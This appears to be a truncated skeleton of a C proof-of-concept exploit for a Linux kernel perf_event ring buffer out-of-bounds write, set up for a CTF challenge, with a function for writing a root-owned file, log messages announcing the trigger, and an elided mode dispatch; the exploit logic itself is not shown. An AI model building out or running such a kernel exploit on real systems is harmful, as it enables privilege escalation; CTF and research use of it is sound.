/*
 * CVE-2023-6931 PoC - CTF Challenge Mode
 *
 * Vulnerability: perf_event ring buffer out-of-bounds write
 *
...
static int mode_write_root_file(const poc_args_t *args) {
    ...
    poc_log("Triggering CVE-2023-6931 vulnerability...");
...
int main(int argc, char *argv[]) {
    ...
    poc_log("=== CVE-2023-6931 CTF PoC ===");
    poc_log("Vuln: perf_event ring buffer out-of-bounds write");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (args.mode && strcmp(args.mode, POC_MODE_READ) == 0)
